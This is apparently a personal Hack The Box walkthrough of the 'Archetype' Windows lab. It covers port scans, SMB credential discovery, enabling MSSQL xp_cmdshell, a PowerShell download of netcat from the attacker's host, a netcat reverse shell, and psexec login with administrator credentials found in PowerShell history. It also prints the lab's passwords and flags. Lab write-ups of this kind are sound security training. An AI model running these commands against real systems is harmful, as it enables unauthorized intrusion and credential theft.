
# #HTB 

![[Pasted image 20251229185014.png|245]]

# HTB: Archetype

**Machine IP:** `10.129.14.229`  
**Difficulty:** Easy  
**OS:** Windows (Server 2019 Standard)

---

## Tools Used
- `rustscan` / `nmap` - Port discovery
- `smbclient` - SMB share enumeration
- `impacket-mssqlclient` - MSSQL interaction
- `impacket-psexec` - Remote command execution
- `nc` - Netcat listener
- `powershell` - File download and reverse shell

---


## Step 1: Reconnaissance - Port Scanning

### RustScan Results

```
sudo rustscan -a 10.129.14.229
```

**Open ports discovered:**
- Port 135 (MSRPC)
- Port 139 (NetBIOS-SSN)
- Port 443 (HTTPS)
- Port 1433 (MSSQL)
- Port 5985 (WinRM)
- Port 47001 (WinRM HTTP)    
- Ports 49664-49669 (RPC)

![[Pasted image 20251229185405.png]]

### Nmap Detailed Scan

```
sudo nmap -sV -sC 10.129.14.229
```

**Key Information:**
- **Hostname:** `ARCHETYPE`
- **Domain:** `ARCHETYPE` (Workgroup, not Domain joined)    
- **OS:** Windows Server 2019 Standard (build 17763)

![[Pasted image 20251229190348.png]]






## Step 2: SMB Enumeration

### List SMB Shares

```
smbclient -L //10.129.14.229 -N
```

**Shares discovered:**
- `ADMIN$` (Remote Admin)
- **`backups`** (Custom share)
- `C$` (Default share)    
- `IPC$` (Remote IPC)

![[Pasted image 20251229190405.png]]


### Connect to `backups` Share

```
smbclient -N //10.129.14.229/backups
```

- **File discovered:** `prod.dtsConfig`

![[Pasted image 20251229190756.png]]

### Download and Read the File

```
smb: \> get prod.dtsConfig
cat prod.dtsConfig
```
**Contents:**
```
<DTSConfiguration>
  <DTSConfigurationHeading>
    <DTSConfigurationHeading>
      <Configuration ConfiguredType="Property" 
                     Path="Package.Connections[Destination].Properties[ConnectionString]" 
                     ValueType="String">
        <ConfiguredValue>
          Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
          Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;
          Auto Translate=False;
        </ConfiguredValue>
      </Configuration>
  </DTSConfigurationHeading>
</DTSConfiguration>
```

![[Pasted image 20251229190901.png]]

**Credentials discovered:**
- **Username:** `ARCHETYPE\sql_svc` (or `sql_svc`)
- **Password:** `M3g4c0rp123`







## Step 3: MSSQL Access

### Connect to MSSQL with Impacket

```
impacket-mssqlclient sql_svc@10.129.14.229
# Password: M3g4c0rp123
```

![[Pasted image 20251229195238.png]]







## Step 4: Command Execution via xp_cmdshell

### Enable xp_cmdshell

```
SQL> enable_xp_cmdshell
SQL> RECONFIGURE;
```

### Test Command Execution

```
SQL> xp_cmdshell "whoami"
```

- **Output:** `archetype\sql_svc`

![[Pasted image 20251229195906.png]]






## Step 5: Reverse Shell

### Upload Netcat

```
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.17.101/nc64.exe -outfile nc64.exe"
```

![[Pasted image 20251229200613.png]]


### Start Listener
```
sudo nc -nlvp 443
```

### Execute Reverse Shell
```
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.17.101 443"
```
- ***Shell received!***

![[Pasted image 20251229200629.png]]






## Step 6: User Flag

```
C:\Users\sql_svc\Desktop> type user.txt
3e7b102e78218e935bf3f4951fec21a3
```

![[Pasted image 20251229200956.png]]







## Step 7: Privilege Escalation - PowerShell History

### Check PowerShell History

```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
```

**Contents:**
```
net.exe Use T:\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

![[Pasted image 20251229201739.png]]

**Administrator credentials discovered:**
- **Username:** `administrator`
- **Password:** `MEGACORP_4dm1n!!`






## Step 8: Root Access via psexec

### Connect as Administrator

```
python3 psexec.py administrator@10.129.14.229
# Password: MEGACORP_4dm1n!!
```


![[Pasted image 20251229201755.png]]






### Root Flag

```
C:\Windows\system32> cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop> type root.txt
b91cce3305e98240082d4474b848528
```

![[Pasted image 20251229202059.png]]





## Step 9: Machine Owned

![[Pasted image 20251229202500.png]]


---

## Flags

|Flag|Value|
|---|---|
|User|`3e7b102e78218e935bf3f4951fec21a3`|
|Root|`b91cce3305e98240082d4474b848528`|

---

## Credentials Table

|User|Password|Source|
|---|---|---|
|sql_svc|M3g4c0rp123|prod.dtsConfig|
|administrator|MEGACORP_4dm1n!!|PowerShell history|

---
